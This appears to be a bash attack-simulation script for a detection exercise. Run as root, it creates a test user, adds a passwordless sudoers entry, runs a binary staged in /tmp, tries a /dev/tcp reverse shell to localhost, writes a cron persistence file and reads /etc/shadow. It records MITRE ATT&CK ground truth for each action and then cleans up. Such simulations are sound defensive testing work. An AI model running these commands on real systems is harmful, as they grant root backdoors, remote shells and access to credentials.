#!/bin/bash
#
# script name : 11-linux_attack_sim.sh
# purpose     : execute a controlled sequence of attacker-like actions
#               against this hardened Linux endpoint (create a user, modify
#               sudoers, execute a binary staged in /tmp, attempt a
#               localhost-only reverse shell, establish cron persistence,
#               access /etc/shadow), recording the exact timestamp and
#               MITRE ATT&CK technique of each action as ground truth for
#               a later detection-matrix correlation task, then clean up
#               every artifact created.
# author      : Aïda Sylla
# date        : 2026-08-09
 
set -euo pipefail
# Action 4 (the reverse shell attempt) is EXPECTED to fail (connection
# refused, since nothing listens on 127.0.0.1:4444) - that failure is the
# whole point of the test, not a script bug; it is launched backgrounded
# and does not propagate its exit status to this script. With -e active,
# every other command that can legitimately return non-zero as part of
# normal control flow (writing under a directory that may not exist in
# every environment, an optional syntax check) is explicitly guarded with
# "if" checks or "|| true" rather than left to propagate.
 
if [[ "${EUID}" -ne 0 ]]; then
    echo "This script must be run as root (it creates a system user, writes to /etc/sudoers.d and /etc/cron.d, and reads /etc/shadow). Try: sudo $0" >&2
    exit 1
fi
 
TEST_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
TMP_BIN="/tmp/suspicious_bin"
CRON_FILE="/etc/cron.d/persistence_test"
GROUND_TRUTH_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/linux_attack_log.json"
TOTAL_ACTIONS=6
 
GROUND_TRUTH_ENTRIES=()
ACTION_ISSUES=()
 
json_escape() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\t'/\\t}"
    s="${s//$'\r'/\\r}"
    s="${s//$'\n'/\\n}"
    printf '%s' "${s}"
}
 
iso8601_utc() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}
 
# add_entry <num> <description> <timestamp> <mitre> <auditd_key> <other_source>
add_entry() {
    local num="$1" desc="$2" ts="$3" mitre="$4" key="$5" other="$6"
    local entry
    entry=$(printf '{"action_number":%s,"description":"%s","timestamp":"%s","mitre_technique":"%s","expected_detection":{"auditd_key":"%s","other_detection_source":"%s"}}' \
        "${num}" "$(json_escape "${desc}")" "${ts}" "$(json_escape "${mitre}")" "$(json_escape "${key}")" "$(json_escape "${other}")")
    GROUND_TRUTH_ENTRIES+=("${entry}")
}
 
print_action_line() {
    local idx="$1" total="$2" label="$3" ts="$4"
    printf "    [%s/%s] %-45s %s\n" "${idx}" "${total}" "${label}..." "${ts}"
}
 
echo "[*] Running Linux attacker simulation..."
 
# ---------------------------------------------------------------------------
# 1. Create a user
# ---------------------------------------------------------------------------
if ! useradd "${TEST_USER}" 2>/tmp/attack_sim_err.log; then
    echo "Warning: useradd failed: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2
    ACTION_ISSUES+=("action 1 (useradd) failed")
fi
ts1="$(iso8601_utc)"
print_action_line 1 "${TOTAL_ACTIONS}" "Creating user ${TEST_USER}" "${ts1}"
add_entry 1 "Create local user account '${TEST_USER}'" "${ts1}" \
    "T1136.001 - Create Account: Local Account" \
    "identity" \
    "auth.log (useradd entry) / /etc/passwd, /etc/shadow modification"
 
# ---------------------------------------------------------------------------
# 2. Modify sudoers
# ---------------------------------------------------------------------------
mkdir -p "$(dirname "${SUDOERS_FILE}")" 2>/dev/null || true
if ! echo "${TEST_USER} ALL=(ALL) NOPASSWD:ALL" >> "${SUDOERS_FILE}" 2>/tmp/attack_sim_err.log; then
    echo "Warning: could not write ${SUDOERS_FILE}: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2
    ACTION_ISSUES+=("action 2 (sudoers write) failed")
fi
chmod 440 "${SUDOERS_FILE}" 2>/dev/null || true
if command -v visudo >/dev/null 2>&1; then
    visudo -c -f "${SUDOERS_FILE}" >/dev/null 2>&1 || echo "Warning: ${SUDOERS_FILE} failed visudo syntax check." >&2
fi
ts2="$(iso8601_utc)"
print_action_line 2 "${TOTAL_ACTIONS}" "Modifying sudoers" "${ts2}"
add_entry 2 "Grant '${TEST_USER}' passwordless sudo via ${SUDOERS_FILE}" "${ts2}" \
    "T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching" \
    "sudoers" \
    "auditd file-write watch on /etc/sudoers.d/ (2x02 Task 5)"
 
# ---------------------------------------------------------------------------
# 3. Execute a binary staged in /tmp
# ---------------------------------------------------------------------------
cp /usr/bin/id "${TMP_BIN}" 2>/dev/null || { echo "Warning: could not stage ${TMP_BIN}" >&2; ACTION_ISSUES+=("action 3 (stage /tmp binary) failed"); }
"${TMP_BIN}" >/dev/null 2>&1 || true
ts3="$(iso8601_utc)"
print_action_line 3 "${TOTAL_ACTIONS}" "Executing from /tmp" "${ts3}"
add_entry 3 "Stage a copy of /usr/bin/id at ${TMP_BIN} and execute it" "${ts3}" \
    "T1059 - Command and Scripting Interpreter (execution from a world-writable staging directory)" \
    "process_exec" \
    "auditd execve watch (2x02 Task 5)"
 
# ---------------------------------------------------------------------------
# 4. Reverse shell attempt to localhost (expected to fail - nothing listens
#    on 127.0.0.1:4444; the attempted connect is the detectable behavior)
# ---------------------------------------------------------------------------
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null || true
sleep 1
kill %1 2>/dev/null || true
ts4="$(iso8601_utc)"
print_action_line 4 "${TOTAL_ACTIONS}" "Reverse shell attempt (localhost)" "${ts4}"
add_entry 4 "Attempt an interactive bash reverse shell to 127.0.0.1:4444 (expected to fail - nothing listens)" "${ts4}" \
    "T1059.004 - Command and Scripting Interpreter: Unix Shell" \
    "network_connect" \
    "auditd socket/connect watch (2x02 Task 5)"
 
# ---------------------------------------------------------------------------
# 5. Cron persistence
#    NOTE: a real /etc/cron.d entry requires a username field
#    (min hour dom mon dow USER command) that the literal task instruction
#    omits. Followed here exactly as specified for fidelity to the task;
#    as written, cron will treat this entry as malformed and will not
#    actually run /tmp/beacon.sh (which doesn't exist anyway) - that does
#    not affect what this step is testing (file creation under
#    /etc/cron.d/, which is what the auditd cron_persist rule watches).
# ---------------------------------------------------------------------------
mkdir -p "$(dirname "${CRON_FILE}")" 2>/dev/null || true
if ! echo "* * * * * /tmp/beacon.sh" > "${CRON_FILE}" 2>/tmp/attack_sim_err.log; then
    echo "Warning: could not write ${CRON_FILE}: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2
    ACTION_ISSUES+=("action 5 (cron file write) failed")
fi
ts5="$(iso8601_utc)"
print_action_line 5 "${TOTAL_ACTIONS}" "Cron persistence" "${ts5}"
add_entry 5 "Create ${CRON_FILE} for cron-based persistence" "${ts5}" \
    "T1053.003 - Scheduled Task/Job: Cron" \
    "cron_persist" \
    "auditd file-write watch on /etc/cron.d/ (2x02 Task 5)"
 
# ---------------------------------------------------------------------------
# 6. Access sensitive files
# ---------------------------------------------------------------------------
cat /etc/shadow > /dev/null 2>/tmp/attack_sim_err.log || { echo "Warning: could not read /etc/shadow: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2; ACTION_ISSUES+=("action 6 (read /etc/shadow) failed"); }
ts6="$(iso8601_utc)"
print_action_line 6 "${TOTAL_ACTIONS}" "Accessing /etc/shadow" "${ts6}"
add_entry 6 "Read /etc/shadow" "${ts6}" \
    "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow" \
    "identity" \
    "auditd identity-file watch rule from the 2x00 baseline - assumed key name 'identity' based on Task 12's expected output; verify against your actual meddefense.rules on billing-srv-01"
 
# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
cleanup_issues=()
 
if id "${TEST_USER}" >/dev/null 2>&1; then
    userdel -r "${TEST_USER}" >/dev/null 2>&1 || cleanup_issues+=("user removal failed")
fi
rm -f "${SUDOERS_FILE}" || cleanup_issues+=("sudoers file removal failed")
rm -f "${TMP_BIN}" || cleanup_issues+=("/tmp binary removal failed")
rm -f "${CRON_FILE}" || cleanup_issues+=("cron file removal failed")
rm -f /tmp/attack_sim_err.log 2>/dev/null || true
 
if [[ "${#cleanup_issues[@]}" -eq 0 && "${#ACTION_ISSUES[@]}" -eq 0 ]]; then
    echo "[*] Cleaning up artifacts...                          [CLEAN]"
else
    echo "[*] Cleaning up artifacts...                          [PARTIAL]"
    for issue in "${ACTION_ISSUES[@]}"; do
        echo "    - ${issue}"
    done
    for issue in "${cleanup_issues[@]}"; do
        echo "    - ${issue}"
    done
fi
 
# ---------------------------------------------------------------------------
# Export ground truth
# ---------------------------------------------------------------------------
{
    printf '{'
    printf '"generated":"%s",' "$(iso8601_utc)"
    printf '"scenario":"Crimson Tide Linux playbook simulation (Task 11)",'
    printf '"actions_executed":%s,' "${#GROUND_TRUTH_ENTRIES[@]}"
    printf '"ground_truth":['
    for i in "${!GROUND_TRUTH_ENTRIES[@]}"; do
        [[ "${i}" -gt 0 ]] && printf ','
        printf '%s' "${GROUND_TRUTH_ENTRIES[$i]}"
    done
    printf ']'
    printf '}'
} > "${GROUND_TRUTH_PATH}"
 
echo "Actions executed: ${#GROUND_TRUTH_ENTRIES[@]}"
echo "Ground truth saved to: $(basename "${GROUND_TRUTH_PATH}")"
